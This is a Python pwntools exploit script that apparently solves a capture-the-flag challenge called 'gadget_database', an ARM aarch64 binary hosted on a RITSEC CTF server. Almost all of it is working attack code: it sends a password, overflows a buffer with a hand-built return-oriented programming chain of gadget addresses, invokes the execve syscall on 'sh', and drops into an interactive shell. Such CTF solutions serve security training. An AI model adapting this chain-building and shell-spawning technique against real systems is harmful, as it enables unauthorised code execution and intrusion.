#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './gadget_database'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'ctf.ritsec.club', 30865

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
set arch aarch64
break *0x040085c
break *0x4057f4
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# ELF 64-bit LSB executable, ARM aarch64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.7.0, not stripped
# Arch:     aarch64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

SYSCALL = 0x413794 # svc #0 ; ret

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'password', b'RS{REALFLAG}')

    header = b''
    header += cyclic(44)
    header += p64(0x04234d0)    # ldp x1, x0, [sp, #0x40] ; blr x1
    
    payload = b''
    payload += cyclic(48)
    payload += p64(0)           # x23 => x2
    payload += cyclic(0x38 - len(payload))
    payload += p64(SYSCALL)     # x24 -> svc #0 ; ret
    payload += cyclic(0x40 - len(payload))
    payload += p64(0x04274f8)   # x1 -> ldp x23, x24, [sp, #0x30] ; mov x2, #0 ; ldp x25, x26, [sp, #0x40] ; ldp x27, x28, [sp, #0x50] ; ldr x16, [sp, #0x68] ; ldr x1, [sp, #0x88] ; ldp x29, x30, [sp], #0xd0 ; br x16
    payload += p64(0x046cbfc)   # x0 -> 'sh'
    payload += p64(0)           # x27 => x1
    payload += cyclic(0x60 - len(payload))
    payload += cyclic(0x68 - len(payload))
    payload += p64(0x04500b8)   # x16 -> mov x3, #0 ; b.ne #0x4500cc ; ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x50 ; ret
    payload += cyclic(0xa8 - len(payload))
    payload += cyclic(0xd8 - len(payload))
    payload += p64(0x04066e0)   # x30v1 - > ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret
    payload += cyclic(0xf0 - len(payload))
    payload += cyclic(56)
    payload += p64(0x04057dc)   # x30v2 -> add x8, x8, x21 ; stp x8, x6, [sp, #0x60] ; mov x2, x23 ; mov x1, x27 ; str x7, [sp, #0x70] ; mov x0, x26 ; blr x24
    payload += cyclic(16)
    payload += p64(0x9d)        # x21 => (0x40 + 0x9d) = 0xdd => x8
    
    payload += cyclic(500 - len(payload))

    io.sendlineafter(b'query', flat(header, payload))

    io.interactive()
    
if __name__ == '__main__':
    exploit()